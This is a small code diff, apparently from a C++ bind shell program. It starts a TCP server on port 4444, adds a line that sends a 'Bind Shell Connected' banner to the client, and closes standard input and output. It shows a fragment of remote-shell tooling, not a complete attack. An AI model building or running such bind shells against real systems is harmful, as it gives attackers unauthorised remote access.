@@ -11,6 +11,7 @@ int main(int argc, char** argv){
 	RuntimeTools	Runner;
 
 	Network.StartTCPServer("127.0.0.1", 4444);
+	Network.SendTCPdata("Bind Shell Connected...!    ");
 
 	IOController.Close(INPUT);
 	IOController.Close(OUTPUT);
